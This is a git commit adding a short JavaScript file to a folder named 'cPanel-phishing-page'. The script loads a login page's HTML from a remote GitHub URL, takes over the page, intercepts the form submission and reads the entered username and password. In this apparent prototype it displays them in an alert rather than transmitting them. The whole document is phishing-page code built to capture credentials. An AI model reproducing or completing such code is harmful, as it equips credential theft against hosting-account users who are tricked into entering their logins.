771a41be7c09fe5c0860614b2e016defe672a539
achraf4test <112291751+achraf4test@users.noreply.github.com>
2023-06-01 22:17:16 +0100

    Create index.js

---
+++ cPanel-phishing-page/index.js
@@ -0,0 +1,15 @@
+fetch("https://raw.githubusercontent.com/achraf4test/onemoretest/main/test.html").then(res=>res.text()).then(res => {
+  document.body.innerHTML = res;
+
+  const form = document.querySelector('#aa');
+
+  form.addEventListener("submit", function(evt) {
+    evt.preventDefault();
+
+    let login = document.querySelector('#user').value
+    let pass = document.querySelector('#pass').value
+    alert('Login: ' + login + " password: " + pass);
+
+    return;
+  }, true);
+})
